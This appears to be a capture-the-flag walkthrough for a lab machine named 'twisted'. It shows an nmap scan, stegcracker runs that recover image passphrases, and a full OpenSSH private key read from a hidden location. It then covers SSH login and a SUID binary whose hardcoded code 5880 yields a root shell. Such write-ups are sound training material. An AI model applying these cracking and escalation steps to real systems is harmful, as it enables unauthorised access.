***Target: 10.0.0.9***

## ***NMAP***

    # nmap -sS -T4 -p- 10.0.0.9

    PORT     STATE SERVICE                                                                                    
    80/tcp   open  http                                                                                       
    2222/tcp open  EtherNetIP-1

Port 2222 is running ssh.

## ***HTTP***

    # stegcracker cat-hidden.jpg /usr/share/wordlists/rockyou.txt 
    StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
    Copyright (c) 2022 - Luke Paris (Paradoxis)

    StegCracker has been retired following the release of StegSeek, which 
    will blast through the rockyou.txt wordlist within 1.9 second as opposed 
    to StegCracker which takes ~5 hours.

    StegSeek can be found at: https://github.com/RickdeJager/stegseek

    Counting lines in wordlist..
    Attacking file 'cat-hidden.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
    Successfully cracked file with password: sexymama
    Tried 964 passwords
    Your file has been written to: cat-hidden.jpg.out
    sexymama

>

    # stegcracker cat-original.jpg 
    StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
    Copyright (c) 2022 - Luke Paris (Paradoxis)

    StegCracker has been retired following the release of StegSeek, which 
    will blast through the rockyou.txt wordlist within 1.9 second as opposed 
    to StegCracker which takes ~5 hours.

    StegSeek can be found at: https://github.com/RickdeJager/stegseek

    No wordlist was specified, using default rockyou.txt wordlist.
    Counting lines in wordlist..
    Attacking file 'cat-original.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
    Successfully cracked file with password: westlife
    Tried 968 passwords
    Your file has been written to: cat-original.jpg.out
    westlife

## ***SSH***

After login in to the two users I found some notes on their home directories.

### ***/home/markus/note.txt:***

    Hi bonita,
    I have saved your id_rsa here: /var/cache/apt/id_rsa
    Nobody can find it.

>

### ***/home/mateo/note.txt:***

    /var/www/html/gogogo.wav


After downloading the wav file to our local machine, I searched for a decoder and got this message.

    G O D E E P E R . . . C O M E W I T H M E . . . L I T T L E R A B B I T . . .

    $ tail -n100 /var/cache/apt/id_rsa

    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd
    FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS
    olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1
    vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF
    gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C
    tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM
    gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC
    xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8
    DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H
    uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD
    XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu
    U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI
    mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/
    hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro
    nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK
    mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+
    bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq
    yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP
    UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh
    V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ
    LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz
    a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF
    eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu
    D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==
    -----END OPENSSH PRIVATE KEY-----

>

    # ssh bonita@10.0.0.9 -i id_rsa -p 2222

### ***/home/bonita/user.txt***
    HMVblackcat

We can find in the bonita's home directory a complied script with suid permissions. After disassembling it we can see that if we enter the right passphrase the functions setuid and setguid are called followed by the function system.

    0x000055a3a269d1b8 <+51>:    call   0x55a3a269d060 <scanf@plt>
    0x000055a3a269d1bd <+56>:    mov    eax,DWORD PTR [rbp-0x4]

The ***scanf*** function is being called and is storing the value entered in the register ***eax***.

    0x000055a3a269d1c0 <+59>:    cmp    eax,0x16f8

The cmp function is used, comparing the user's input with the hex value ***0x16f8***. Decoding the value from hex (base16) to decimal (base10).

    Hex:
    0x16f8

    Decimal: 
    5880

>

Let's run the script with the code we found and check if get root access.

    $ ./beroot 
    Enter the code:
    5880
    root@twisted:~# id -a
    uid=0(root) gid=0(root) groups=0(root),1002(bonita)

    # cat root.txt 
    HMVwhereismycat